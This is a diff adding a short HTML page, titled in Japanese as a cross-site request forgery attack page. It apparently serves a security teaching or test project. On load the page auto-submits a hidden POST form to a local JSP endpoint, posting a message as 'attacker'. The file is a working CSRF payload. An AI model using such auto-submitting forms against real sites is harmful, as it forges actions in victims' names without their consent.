@@ -1,0 +1,15 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta http-equiv="Content-" content="text/javascript">
+<title>crossSiteRequestForgeriesAttack：攻撃用ページ</title>
+</head>
+<body onload="document.attackform.submit();">
+  <form name="attackform" method="post" action="crossSiteScriptingTest.jsp">
+  	<input type="hidden" name="userName" value="攻撃者" />
+  	<input type="hidden" name="body" value="攻撃者の書き込み" />
+  	<input type="submit"  value="送信" />
+  </form>
+</body>
+</html>
